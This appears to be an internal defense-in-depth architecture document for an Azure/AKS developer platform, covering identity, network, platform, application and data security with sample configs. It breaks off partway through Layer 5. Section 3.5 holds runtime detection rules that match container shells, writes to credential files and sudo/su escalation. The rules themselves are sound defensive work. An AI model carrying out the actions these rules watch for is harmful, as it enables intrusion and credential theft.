# Defense-in-Depth Architecture - Crusoe IDP

**Document Version:** 1.0  
**Last Updated:** December 21, 2024  
**Owner:** Security Team  
**Status:** Active

-----

## 📋 Table of Contents

- [Introduction](#introduction)
- [Defense-in-Depth Philosophy](#defense-in-depth-philosophy)
- [Architecture Overview](#architecture-overview)
- [Layer 1: Identity & Access Management](#layer-1-identity--access-management)
- [Layer 2: Network Security](#layer-2-network-security)
- [Layer 3: Platform Security](#layer-3-platform-security)
- [Layer 4: Application Security](#layer-4-application-security)
- [Layer 5: Data Security](#layer-5-data-security)
- [Layer 6: Monitoring & Response](#layer-6-monitoring--response)
- [Cross-Layer Security Principles](#cross-layer-security-principles)
- [Attack Scenario Walkthrough](#attack-scenario-walkthrough)
- [Security Control Matrix](#security-control-matrix)
- [Implementation Checklist](#implementation-checklist)
- [Compliance Mapping](#compliance-mapping)
- [References](#references)

-----

## 🛡️ Introduction

### What is Defense-in-Depth?

Defense-in-Depth is a cybersecurity strategy that employs multiple layers of security controls throughout an IT system. The principle is simple: **if one layer fails, another layer is there to thwart the attack**.

Think of it like a medieval castle:

- **Moat** (Network perimeter)
- **Outer walls** (Firewalls)
- **Guards** (Authentication)
- **Inner walls** (Segmentation)
- **Vault** (Encryption)
- **Watchtowers** (Monitoring)

### Why Defense-in-Depth?

**Single Point of Failure is Unacceptable:**

- No security control is perfect
- Attackers are sophisticated and persistent
- Zero-day vulnerabilities emerge constantly
- Insider threats can bypass perimeter controls
- Configuration errors happen

**Our Commitment:**

> “Assume breach, verify everything, minimize impact”

### Key Principles

1. **Redundancy**: Multiple overlapping controls
1. **Diversity**: Different types of security mechanisms
1. **Compartmentalization**: Limit blast radius
1. **Least Privilege**: Minimum necessary access
1. **Defense at Every Layer**: Security is everyone’s responsibility

-----

## 🏗️ Defense-in-Depth Philosophy

### Core Tenets

#### 1. Assume Breach

We design our systems assuming that attackers **will** breach the perimeter. The question is not “if” but “when.”

**Implications:**

- Every layer must independently verify trust
- No implicit trust between components
- Continuous monitoring for anomalies
- Rapid detection and response capabilities

#### 2. Zero Trust Architecture

> “Never trust, always verify, assume breach”

**Zero Trust Principles Applied:**

- Verify explicitly (every request, every time)
- Use least privilege access
- Assume breach (limit blast radius)

#### 3. Layered Security

Each layer provides:

- **Prevention**: Stop attacks before they happen
- **Detection**: Identify attacks in progress
- **Response**: Contain and remediate breaches

#### 4. Security by Design

Security is not bolted on—it’s baked into every architectural decision from day one.

-----

## 🌐 Architecture Overview

### The Six Layers

```
┌─────────────────────────────────────────────────────────────────┐
│                  DEFENSE-IN-DEPTH ARCHITECTURE                  │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│  Layer 6: Monitoring & Response                                 │
│  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ │
│  Azure Sentinel • Defender for Cloud • Automated Response      │
│  Log Analytics • Container Insights • Threat Intelligence      │
└─────────────────────────────────────────────────────────────────┘
                              ▲
                              │ Observes all layers
                              │
┌─────────────────────────────────────────────────────────────────┐
│  Layer 5: Data Security                                         │
│  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ │
│  Encryption at Rest (AES-256) • Encryption in Transit (TLS 1.3)│
│  Azure Key Vault • Backup Encryption • Data Classification     │
└─────────────────────────────────────────────────────────────────┘
                              ▲
                              │ Protects
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  Layer 4: Application Security                                  │
│  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ │
│  SAST/DAST • Container Scanning • Dependency Scanning          │
│  Secret Scanning • Code Review • Security Gates in CI/CD       │
└─────────────────────────────────────────────────────────────────┘
                              ▲
                              │ Runs on
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  Layer 3: Platform Security                                     │
│  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ │
│  Private AKS • Network Policies • Pod Security Standards        │
│  RBAC • Runtime Security • Image Signing                        │
└─────────────────────────────────────────────────────────────────┘
                              ▲
                              │ Protected by
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  Layer 2: Network Security                                      │
│  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ │
│  Azure Firewall • NSGs • Private Endpoints • DDoS Protection   │
│  WAF • Network Segmentation • TLS Everywhere                    │
└─────────────────────────────────────────────────────────────────┘
                              ▲
                              │ Authenticates
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  Layer 1: Identity & Access Management                          │
│  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ │
│  Azure AD + MFA • Conditional Access • PIM • Managed Identities│
│  RBAC Everywhere • Just-in-Time Access • Zero Standing Privileges│
└─────────────────────────────────────────────────────────────────┘
```

### How Layers Interact

**Attack Progression vs. Defense Layers:**

```
Attacker Action          │  Defense Layer Response
─────────────────────────┼────────────────────────────────────
1. Scan for targets      │  Layer 2: Firewall blocks reconnaissance
                         │  Layer 6: Monitoring alerts on scanning
                         │
2. Attempt login         │  Layer 1: MFA required
                         │  Layer 6: Rate limiting, anomaly detection
                         │
3. Exploit vulnerability │  Layer 4: Vulnerability already patched
                         │  Layer 6: IDS/IPS blocks exploit attempt
                         │
4. Execute malicious code│  Layer 3: Container restrictions prevent
                         │  Layer 6: Runtime security detects anomaly
                         │
5. Escalate privileges   │  Layer 1: RBAC denies elevation
                         │  Layer 6: Privileged operation logged
                         │
6. Lateral movement      │  Layer 2: Network policies block pod-to-pod
                         │  Layer 6: Unusual network traffic detected
                         │
7. Access secrets        │  Layer 5: Key Vault requires separate auth
                         │  Layer 6: Secret access logged and alerted
                         │
8. Exfiltrate data       │  Layer 2: Egress firewall blocks unknown IPs
                         │  Layer 6: Data exfiltration pattern detected
```

**Result:** Attack stopped at multiple points. Even if one layer fails, others contain the breach.

-----

## 🔐 Layer 1: Identity & Access Management

### Purpose

Establish and verify the identity of every user, service, and device accessing the platform.

### Core Principle

> “Trust no one, verify everyone, grant minimum access”

### Components

#### 1.1 Azure Active Directory (Azure AD)

**What it does:**

- Centralized identity management
- Single sign-on (SSO)
- Multi-factor authentication (MFA)
- Conditional access policies

**Configuration:**

```yaml
Authentication:
  Provider: Azure AD
  MFA: Required for all users
  Conditional Access:
    - Require MFA for admin roles
    - Require compliant device
    - Require approved location
    - Block legacy authentication
  
  Password Policy:
    MinLength: 14
    Complexity: Required
    History: 24 passwords
    MaxAge: 90 days
    LockoutThreshold: 5 attempts
    LockoutDuration: 30 minutes
```

**Security Benefits:**

- ✅ Prevents credential stuffing
- ✅ Blocks brute force attacks
- ✅ Detects impossible travel
- ✅ Enforces device compliance

#### 1.2 Multi-Factor Authentication (MFA)

**Enforcement:**

- **Required for**: All users, all access
- **Methods**: Microsoft Authenticator (preferred), SMS (backup), Hardware tokens
- **Grace period**: None—MFA from day one

**MFA Bypass Scenarios (Logged & Alerted):**

- Emergency access accounts (break-glass)
- Service principals (use managed identities instead)

#### 1.3 Privileged Identity Management (PIM)

**Zero Standing Privileges:**

```
Traditional Approach          │  PIM Approach
─────────────────────────────┼─────────────────────────────
User has permanent admin role│  User has eligible role
24/7 admin access            │  Activate for max 8 hours
No approval needed           │  Approval required
No time limit                │  Automatic expiration
Always at risk               │  Minimal exposure window
```

**PIM Configuration:**

```yaml
Privileged Roles:
  AKS Cluster Admin:
    Activation: Approval required
    MaxDuration: 8 hours
    Approvers: [Security Team, Platform Lead]
    MFA: Required on activation
    Justification: Required
  
  Key Vault Administrator:
    Activation: Approval required
    MaxDuration: 4 hours
    Approvers: [CISO, Security Lead]
    MFA: Required on activation
    Ticket: Required
```

#### 1.4 Managed Identities

**No Passwords, No Keys, No Secrets:**

```
Service-to-Service Authentication:
┌──────────────┐            ┌──────────────┐
│   AKS Pod    │───────────▶│  Key Vault   │
│              │            │              │
│ Managed ID:  │  Requests  │ Verifies:    │
│ aks-workload │  Secret    │ - Identity   │
│              │            │ - RBAC       │
└──────────────┘            └──────────────┘
      │                            │
      │ Azure AD token             │ Returns secret
      │ (auto-managed)             │ (if authorized)
      ▼                            ▼
   Identity verified          Access granted
```

**Benefits:**

- ✅ No credential rotation needed (Azure handles it)
- ✅ No secrets in code or config
- ✅ Automatic expiration and renewal
- ✅ Full audit trail

#### 1.5 Role-Based Access Control (RBAC)

**Principle of Least Privilege:**

```yaml
RBAC Model:
  Developers:
    - Read: All namespaces
    - Write: Dev namespaces only
    - No access: Production, secrets
  
  Platform Engineers:
    - Read: All resources
    - Write: Infrastructure, platform namespaces
    - No access: Application secrets
  
  Security Team:
    - Read: Everything
    - Write: Security policies, Key Vault
    - Admin: Security tools only
  
  Admins (PIM Only):
    - Full access when activated
    - Approval required
    - Time-limited (max 8 hours)
```

### Security Controls

|Control               |Implementation              |Threats Mitigated               |
|----------------------|----------------------------|--------------------------------|
|**MFA**               |Azure AD, required for all  |Credential stuffing, phishing   |
|**Conditional Access**|Location, device, risk-based|Compromised credentials         |
|**PIM**               |Just-in-time elevation      |Privilege abuse, insider threats|
|**Managed Identities**|No passwords/keys           |Credential theft                |
|**RBAC**              |Least privilege             |Lateral movement, data access   |
|**Session Management**|Timeout, re-auth            |Session hijacking               |

### Attack Scenario: Credential Compromise

**Attack:** Attacker obtains user password via phishing

**Defense Layers:**

1. **Layer 1 (Identity)**:
- ❌ Password compromised
- ✅ MFA blocks login (attacker doesn’t have second factor)
- ✅ Conditional access detects unusual location
- ✅ Risk-based authentication forces step-up auth

**Result:** Attack stopped at Layer 1. User notified of compromise.

-----

## 🌐 Layer 2: Network Security

### Purpose

Control and monitor network traffic to prevent unauthorized access and lateral movement.

### Core Principle

> “Default deny, explicit allow, segment everything”

### Components

#### 2.1 Network Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                     Azure Virtual Network                    │
│                        10.0.0.0/16                          │
│                                                             │
│  ┌──────────────────────────────────────────────────────┐  │
│  │  Azure Firewall Subnet (10.0.0.0/24)                 │  │
│  │  ┌────────────────────────────────────────────────┐  │  │
│  │  │ Azure Firewall                                  │  │  │
│  │  │ - Egress filtering                              │  │  │
│  │  │ - Threat intelligence                           │  │  │
│  │  │ - FQDN-based rules                              │  │  │
│  │  └────────────────────────────────────────────────┘  │  │
│  └──────────────────────────────────────────────────────┘  │
│                                                             │
│  ┌──────────────────────────────────────────────────────┐  │
│  │  AKS System Node Subnet (10.0.1.0/24)               │  │
│  │  NSG: Allow only required traffic                    │  │
│  └──────────────────────────────────────────────────────┘  │
│                                                             │
│  ┌──────────────────────────────────────────────────────┐  │
│  │  AKS Workload Node Subnet (10.0.2.0/23)             │  │
│  │  NSG: Strict ingress/egress rules                    │  │
│  └──────────────────────────────────────────────────────┘  │
│                                                             │
│  ┌──────────────────────────────────────────────────────┐  │
│  │  Private Endpoints Subnet (10.0.4.0/24)             │  │
│  │  - Key Vault (private only)                          │  │
│  │  - ACR (private only)                                │  │
│  │  - Storage (private only)                            │  │
│  └──────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
```

#### 2.2 Azure Firewall

**Egress Filtering Strategy:**

```yaml
Firewall Rules (Priority Order):

1. Deny All (Default):
   - Action: Deny
   - Source: *
   - Destination: *
   - Ports: *

2. Allow AKS Required:
   - Action: Allow
   - Destinations:
     - *.hcp.<region>.azmk8s.io (AKS API)
     - mcr.microsoft.com (Container images)
     - *.data.mcr.microsoft.com
     - management.azure.com (Azure APIs)
   - Ports: 443

3. Allow Container Registries:
   - Action: Allow
   - Destinations:
     - docker.io
     - ghcr.io
     - gcr.io
     - quay.io
   - Ports: 443
   - Threat Intelligence: Enabled

4. Allow Package Managers:
   - Action: Allow
   - Destinations:
     - pypi.org (Python packages)
     - npmjs.org (Node packages)
     - registry.terraform.io
   - Ports: 443
   - Malware Scanning: Enabled

5. Allow Azure Services:
   - Action: Allow
   - Service Tags:
     - AzureKeyVault
     - AzureContainerRegistry
     - AzureActiveDirectory
```

**Security Benefits:**

- ✅ Prevents data exfiltration to unknown IPs
- ✅ Blocks command-and-control callbacks
- ✅ Detects malicious domains (threat intelligence)
- ✅ Forces all traffic through inspection

#### 2.3 Network Security Groups (NSGs)

**Default Deny Approach:**

```yaml
AKS Workload Subnet NSG:

Inbound Rules:
  Priority 100: Deny All (Default)
  Priority 200: Allow from Azure Load Balancer
  Priority 300: Allow from AKS System Subnet (limited ports)

Outbound Rules:
  Priority 100: Deny All (Default)
  Priority 200: Allow to Azure Firewall
  Priority 300: Allow to Azure Services (Service Tags)
  Priority 400: Allow DNS (53)
```

#### 2.4 Private Endpoints

**No Public Access:**

```
Traditional Approach          │  Private Endpoint Approach
─────────────────────────────┼─────────────────────────────
Key Vault: public IP         │  Key Vault: private IP only
Accessible from internet     │  Only from VNet
Public DNS resolution        │  Private DNS zone
Firewall rules for security  │  Network isolation
```

**Configuration:**

```yaml
Azure Key Vault:
  PublicNetworkAccess: Disabled
  PrivateEndpoint:
    Subnet: 10.0.4.0/24
    PrivateDNS: privatelink.vaultcore.azure.net
  
Azure Container Registry:
  PublicNetworkAccess: Disabled
  PrivateEndpoint:
    Subnet: 10.0.4.0/24
    PrivateDNS: privatelink.azurecr.io

Azure Storage:
  PublicNetworkAccess: Disabled
  PrivateEndpoint:
    Subnet: 10.0.4.0/24
    PrivateDNS: privatelink.blob.core.windows.net
```

#### 2.5 DDoS Protection

**Azure DDoS Protection Standard:**

```yaml
Protection Features:
  - Adaptive tuning (learns normal traffic patterns)
  - Always-on traffic monitoring
  - Automatic attack mitigation
  - Attack analytics and reporting
  - Cost protection guarantee
  
Mitigation Policies:
  - TCP SYN flood protection
  - UDP flood protection
  - DNS amplification protection
  - HTTP/HTTPS flood protection
```

#### 2.6 Web Application Firewall (WAF)

**Azure Front Door + WAF:**

```yaml
WAF Configuration:
  Mode: Prevention
  RuleSet: OWASP 3.2
  
Custom Rules:
  - Block SQL injection patterns
  - Block XSS attempts
  - Block command injection
  - Rate limit: 100 req/min per IP
  - Geo-blocking: Block high-risk countries
  
Bot Protection:
  - Good bots: Allow (search engines)
  - Bad bots: Block (scrapers, scanners)
  - Unknown bots: Challenge (CAPTCHA)
```

### Security Controls

|Control                 |Implementation     |Threats Mitigated               |
|------------------------|-------------------|--------------------------------|
|**Azure Firewall**      |Egress filtering   |Data exfiltration, C2 callbacks |
|**NSGs**                |Default deny       |Lateral movement, reconnaissance|
|**Private Endpoints**   |No public IPs      |Internet-based attacks          |
|**DDoS Protection**     |Azure DDoS Standard|Availability attacks            |
|**WAF**                 |OWASP rules        |Web attacks (XSS, SQLi, etc.)   |
|**Network Segmentation**|VNet subnets       |Blast radius limitation         |

### Attack Scenario: Lateral Movement

**Attack:** Attacker compromises one pod, attempts to move to other pods

**Defense Layers:**

1. **Layer 3 (Network)**:
- ✅ Network policies deny pod-to-pod traffic by default
- ✅ NSG blocks traffic between subnets
- ✅ Firewall inspects east-west traffic

**Result:** Lateral movement blocked. Attacker contained in single pod.

-----

## ☸️ Layer 3: Platform Security

### Purpose

Secure the Kubernetes platform itself and enforce runtime security policies.

### Core Principle

> “Private by default, segmented by policy, monitored continuously”

### Components

#### 3.1 Private AKS Cluster

**No Public API Server:**

```
Traditional AKS              │  Private AKS
────────────────────────────┼─────────────────────────────
API Server: Public IP       │  API Server: Private IP only
Accessible from internet    │  Only from VNet
kubectl from anywhere       │  kubectl via VPN/bastion
Public attack surface       │  No internet exposure
```

**Configuration:**

```hcl
resource "azurerm_kubernetes_cluster" "aks" {
  name                    = "aks-idp-prod"
  private_cluster_enabled = true
  
  # No public FQDN
  private_dns_zone_id = azurerm_private_dns_zone.aks.id
  
  # Private link for API server
  api_server_access_profile {
    authorized_ip_ranges = []  # Empty = private only
  }
}
```

#### 3.2 Kubernetes RBAC

**Zero Default Permissions:**

```yaml
# Developers: Limited to their namespaces
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: dev-team-binding
  namespace: app-dev
subjects:
- kind: Group
  name: "developers@crusoe-island.com"
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: Role
  name: developer
  apiGroup: rbac.authorization.k8s.io

---
# Developer role: Read/write in namespace only
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: developer
  namespace: app-dev
rules:
- apiGroups: ["", "apps", "batch"]
  resources: ["pods", "deployments", "services", "jobs"]
  verbs: ["get", "list", "create", "update", "delete"]
- apiGroups: [""]
  resources: ["secrets", "configmaps"]
  verbs: ["get", "list"]  # Read only
```

**RBAC Hierarchy:**

```
Cluster Admin (PIM only)
  └─▶ Platform Admin
      └─▶ Namespace Admin
          └─▶ Developer
              └─▶ Read-Only User
```

#### 3.3 Network Policies (Calico)

**Default Deny Everything:**

```yaml
# Global default: Deny all traffic
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: production
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress

---
# Explicit allow: Frontend to Backend only
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: frontend-to-backend
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: backend
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: frontend
    ports:
    - protocol: TCP
      port: 8080

---
# Allow DNS only
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-dns
  namespace: production
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  - to:
    - namespaceSelector:
        matchLabels:
          name: kube-system
    ports:
    - protocol: UDP
      port: 53
```

#### 3.4 Pod Security Standards

**Restrict Pod Capabilities:**

```yaml
# Pod Security Standard: Restricted
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted

# Enforces:
# ✅ Non-root user required
# ✅ No privilege escalation
# ✅ Read-only root filesystem
# ✅ Drop all capabilities
# ✅ No host network/IPC/PID
# ✅ Seccomp profile required
```

**Example Secure Pod:**

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-app
  namespace: production
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    fsGroup: 2000
    seccompProfile:
      type: RuntimeDefault
  
  containers:
  - name: app
    image: myapp:1.0.0
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop:
          - ALL
    
    resources:
      limits:
        memory: "512Mi"
        cpu: "500m"
      requests:
        memory: "256Mi"
        cpu: "250m"
    
    volumeMounts:
    - name: tmp
      mountPath: /tmp
  
  volumes:
  - name: tmp
    emptyDir: {}
```

#### 3.5 Runtime Security (Falco)

**Detect Anomalous Behavior:**

```yaml
Falco Rules:

# Alert on shell in container
- rule: Shell spawned in container
  condition: >
    spawned_process and container and
    proc.name in (bash, sh)
  output: Shell spawned in container (user=%user.name container=%container.name)
  priority: WARNING

# Alert on sensitive file access
- rule: Sensitive file opened for writing
  condition: >
    open_write and container and
    fd.name in (/etc/passwd, /etc/shadow)
  output: Sensitive file opened for writing (file=%fd.name)
  priority: CRITICAL

# Alert on privilege escalation
- rule: Privilege escalation attempt
  condition: >
    spawned_process and container and
    proc.name in (sudo, su)
  output: Privilege escalation attempt (user=%user.name command=%proc.cmdline)
  priority: CRITICAL
```

#### 3.6 Image Security

**Trusted Images Only:**

```yaml
Image Security Pipeline:

1. Build:
   - Minimal base images (distroless, Alpine)
   - Multi-stage builds
   - .dockerignore (exclude secrets)

2. Scan:
   - Trivy: Vulnerability scanning
   - Snyk: Dependency analysis
   - Hadolint: Dockerfile linting
   - Custom validation script

3. Sign:
   - Cosign: Image signing
   - Verify signatures at deployment

4. Policy:
   - OPA/Gatekeeper: Only allow signed images
   - ImagePullPolicy: Always
   - Private registry only (ACR)
```

**Admission Controller:**

```yaml
# Only allow images from trusted registry
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sAllowedRepos
metadata:
  name: allowed-repositories
spec:
  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Pod"]
  parameters:
    repos:
    - "crusoidp.azurecr.io"
    - "mcr.microsoft.com"  # Microsoft base images only
```

### Security Controls

|Control             |Implementation      |Threats Mitigated                     |
|--------------------|--------------------|--------------------------------------|
|**Private Cluster** |No public API       |Internet-based attacks on API         |
|**RBAC**            |Azure AD integration|Unauthorized access, privilege abuse  |
|**Network Policies**|Calico, default deny|Lateral movement, pod-to-pod attacks  |
|**Pod Security**    |Restricted standard |Container escape, privilege escalation|
|**Runtime Security**|Falco               |Anomalous behavior, intrusions        |
|**Image Signing**   |Cosign              |Supply chain attacks                  |

### Attack Scenario: Container Escape

**Attack:** Attacker exploits vulnerability to escape container

**Defense Layers:**

1. **Layer 3 (Platform)**:
- ✅ Pod Security Standard blocks privileged containers
- ✅ Read-only root filesystem prevents file modifications
- ✅ Dropped capabilities limit escape vectors
- ✅ Falco detects unusual behavior
- ✅ AppArmor/SELinux provides additional containment

**Result:** Container escape prevented or detected immediately.

-----

## 💻 Layer 4: Application Security

### Purpose

Ensure application code and dependencies are secure throughout the development lifecycle.

### Core Principle

> “Shift left, scan everything, fail fast on critical issues”

### Components

#### 4.1 Static Application Security Testing (SAST)

**Code Analysis Before Deployment:**

```yaml
SAST Tools:

CodeQL (GitHub):
  - Languages: Python, JavaScript, TypeScript, Go
  - Queries: security-extended, security-and-quality
  - Runs: On every PR

Semgrep:
  - Rulesets: OWASP Top 10, secrets, cloud security
  - Runs: On every commit
  - Blocks: HIGH and CRITICAL findings

SonarQube:
  - Quality Gate: Pass required
  - Security Hotspots: Must be reviewed
  - Coverage: Minimum 80%
  - Runs: On PR and main branch
```

**Example SonarQube Quality Gate:**

```yaml
Quality Gate:
  Conditions:
    - Security: 0 vulnerabilities (A rating)
    - Reliability: 0 bugs (A rating)
    - Maintainability: Technical debt < 5%
    - Coverage: >= 80%
    - Duplications: < 3%
  
  On Failure: Block merge to main
```

#### 4.2 Dynamic Application Security Testing (DAST)

**Runtime Security Testing:**

```yaml
OWASP ZAP Pipeline:

Stages:
  1. Baseline Scan:
     - Quick scan of application
     - Identifies common vulnerabilities
     - Runs: On every deployment to dev
  
  2. Full Scan:
     - Deep crawl and scan
     - Active testing
     - Runs: Nightly on dev environment
  
  3. API Scan:
     - OpenAPI/Swagger import
     - Automated API fuzzing
     - Authentication testing
     - Runs: On API changes

Findings:
  - CRITICAL/HIGH: Block deployment
  - MEDIUM: Create ticket
  - LOW: Log only
```

#### 4.3 Dependency Scanning

**Supply Chain Security:**

```yaml
Dependency Scanning:

OWASP Dependency Check:
  - Checks: CVE database
  - Fail on: CVSS >= 7.0
  - Runs: Daily + on dependency changes

Snyk:
  - Open Source scanning
  - License compliance
  - Fix recommendations
  - Runs: On PR

Renovate/Dependabot:
  - Automated dependency updates
  - Security patches prioritized
  - Grouped updates (avoid noise)
```

**Example Dependency Policy:**

```yaml
Dependency Policy:

CRITICAL Vulnerability:
  - Action: Block deployment immediately
  - Fix SLA: 24 hours
  - Approval: CISO required for exception

HIGH Vulnerability:
  - Action: Create P0 ticket
  - Fix SLA: 7 days
  - Approval: Security team for exception

MEDIUM Vulnerability:
  - Action: Create P1 ticket
  - Fix SLA: 30 days

Outdated Dependencies:
  - Action: Monthly update cycle
  - Major versions: Manual review
  - Minor/patch: Automated
```

#### 4.4 Secret Scanning

**No Secrets in Code:**

```yaml
Secret Scanning:

detect-secrets (Pre-commit):
  - Scans: All commits
  - Baseline: .secrets.baseline
  - Plugins: All available
  - Action: Block commit if secrets found

TruffleHog (CI/CD):
  - Scans: Entire repository history
  - Verified: Only verified secrets
  - Runs: On PR, nightly

GitLeaks:
  - Scans: Diffs and full repository
  - Custom rules: API keys, tokens, passwords
  - Action: Block PR if leaked secret

GitHub Secret Scanning:
  - Partner patterns: Automatically enabled
  - Custom patterns: Defined in repo settings
  - Alerts: Security team notified
```

#### 4.5 Container Scanning

**Image Vulnerability Analysis:**

```yaml
Container Scanning Pipeline:

Trivy:
  - Severity: CRITICAL, HIGH, MEDIUM
  - Targets: OS packages, language dependencies
  - Fail on: CRITICAL vulnerabilities
  - Runs: On image build

Snyk Container:
  - Base image recommendations
  - Dockerfile analysis
  - Fix suggestions
  - Runs: On PR

Grype:
  - Alternative scanner (redundancy)
  - SBOM generation
  - Runs: Nightly on registry

Dockle:
  - Best practice checks
  - CIS Benchmark
  - Runs: On image build
```

**Scan Gate Example:**

```yaml
Container Scan Gate:

Trivy Results:
  CRITICAL: 0
  HIGH: 2
  MEDIUM: 15
  
Decision: ❌ BLOCK
Reason: CRITICAL vulnerabilities must be 0

Action Required:
  - Update base image
  - Patch vulnerable packages
  - Re-scan before deployment
```

#### 4.6 Code Review

**Human Security Review:**

```yaml
Code Review Requirements:

All Code Changes:
  - Minimum: 1 approval
  - Security-sensitive: 2 approvals (1 from security team)
  - CODEOWNERS: Enforced for critical paths

Security Review Triggers:
  - Authentication/authorization changes
  - Cryptography usage
  - Network configuration
  - RBAC modifications
  - Terraform changes
  - Dockerfile changes

Review Checklist:
  ☐ Input validation implemented
  ☐ Output encoding for XSS prevention
  ☐ SQL queries parameterized
  ☐ Secrets not in code
  ☐ Error handling doesn't leak information
  ☐ Logging doesn't include sensitive data
  ☐ Rate limiting implemented
  ☐ CSRF protection enabled
```

### Security Controls

|Control            |Implementation            |Threats Mitigated                 |
|-------------------|--------------------------|----------------------------------|
|**SAST**           |CodeQL, Semgrep, SonarQube|Code vulnerabilities, logic flaws |
|**DAST**           |OWASP ZAP                 |Runtime vulnerabilities, misconfig|
|**Dependency Scan**|OWASP DC, Snyk            |Supply chain attacks              |
|**Secret Scan**    |detect-secrets, TruffleHog|Credential exposure               |
|**Container Scan** |Trivy, Snyk               |Vulnerable packages, malware      |
|**Code Review**    |Pull requests, CODEOWNERS |Human error, backdoors            |

### Attack Scenario: Code Injection

**Attack:** Attacker attempts SQL injection

**Defense Layers:**

1. **Layer 4 (Application)**:
- ✅ SAST detects SQL concatenation in code review
- ✅ DAST attempts injection, WAF blocks
- ✅ Parameterized queries prevent injection
- ✅ Input validation rejects malicious input

**Result:** Injection attempt fails at multiple points.

-----

## 🔐 Layer 5: Data Security

### Purpose

Protect data confidentiality, integrity, and availability through encryption and access controls.

### Core Principle

> “Encrypt everything, everywhere, all the time”

### Components

#### 5.1 Encryption at Rest

**All Data Encrypted:**

```yaml
Azure Storage:
  Encryption: Microsoft-managed keys (default)
  Option: Customer-managed keys (CMK) in Key Vault
  Algorithm: AES-256
  
Azure SQL Database:
  Transparent Data Encryption (TDE): Enabled
  Algorithm: AES-256
  Backup Encryption: Automatic

Azure Disk Encryption:
  OS Disks: Encrypted (platform-managed keys)
  Data Disks: Encrypted (platform-managed keys)
  Encryption at Host: Enabled for AKS nodes

Kubernetes Secrets:
  etcd Encryption: Enabled
  Key: Stored in Azure Key Vault
  Rotation: Every 90 days
```

**Configuration Example:**

```hcl
resource "azurerm_kubernetes_cluster" "aks" {
  # ... other config ...
  
  # Encrypt Kubernetes secrets at rest
  key_vault_secrets_provider {
    secret_rotation_enabled  = true
    secret_rotation_interval = "2m"
  }
}

resource "azurerm_storage_account" "data" {
  # ... other config ...
  
  # Customer-managed key for storage encryption
  encryption {
    key_vault_key_id          = azurerm_key_vault_key.storage.id
    user_assigned_identity_id = azurerm_user_assigned_identity.storage.id
  }
}
```

#### 5.2 Encryption in Transit

**TLS Everywhere:**

```yaml
TLS Configuration:

Minimum Version: TLS 1.3
Cipher Suites: Modern, secure only
  - TLS_AES_128_GCM_SHA256
  - TLS_AES_256_GCM_SHA384
  - TLS_CHACHA20_POLY1305_SHA256

Disabled:
  - TLS 1.0, 1.1, 1.2
  - Weak ciphers (RC4, DES, 3DES)
  - Anonymous ciphers

Certificate Management:
  - Automated: cert-manager in Kubernetes
  - CA: Let's Encrypt (public) + Internal CA (private)
  - Rotation: Automated, 90 days
  - OCSP Stapling: Enabled
```

**Ingress TLS:**

```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: secure-app
  annotations:
    cert-manager.io/cluster-issuer: "letsencrypt-prod"
    nginx.ingress.kubernetes.io/ssl-redirect: "true"
    nginx.ingress.kubernetes.io/force-ssl-redirect: "true"
    nginx.ingress.kubernetes.io/ssl-protocols: "TLSv1.3"
spec:
  tls:
  - hosts:
    - app.crusoe-island.com
    secretName: app-tls
  rules:
  - host: app.crusoe-island.com
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: app-service
            port:
              number: 443
```

#### 5.3 Azure Key Vault

**Centralized Secrets Management:**

```yaml
Key Vault Configuration:

Access:
  - Public Access: Disabled
  - Private Endpoint: Enabled
  - Authorized Networks: VNet only

RBAC:
  - Authorization: Azure RBAC (not access policies)
  - Least Privilege: Role-specific
  - Audit: All access logged

Protection:
  - Soft Delete: Enabled (90 days)
  - Purge Protection: Enabled
  - Do Not Purge: Critical secrets

Rotation:
  - Automatic: Every 90 days
  - Notification: 30 days before expiration
  - Versioning: Enabled (previous versions retained)

Monitoring:
  - Diagnostics: Enabled
  - Destination: Log Analytics
  - Events: All operations logged
```

**Secret Access Pattern:**

```yaml
# Application pod requests secret
apiVersion: v1
kind: Pod
metadata:
  name: app-pod
spec:
  serviceAccountName: app-sa  # Linked to managed identity
  
  volumes:
  - name: secrets-store
    csi:
      driver: secrets-store.csi.k8s.io
      readOnly: true
      volumeAttributes:
        secretProviderClass: "azure-sync"
  
  containers:
